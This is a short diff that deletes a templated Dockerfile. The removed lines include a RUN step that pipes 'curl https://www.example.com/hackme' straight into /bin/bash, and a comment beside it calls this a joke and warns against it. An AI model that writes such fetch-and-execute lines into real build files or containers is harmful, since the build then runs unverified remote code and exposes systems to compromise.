@@ -1,5 +1,0 @@
-FROM {{ seed_image }}
-
-RUN {{ "build-essential libssl-dev python-dev" | apt_install }}
-# No, don't actually do something like this. Ever. This is just a joke.
-RUN OUTPUT=/build curl https://www.example.com/hackme | /bin/bash
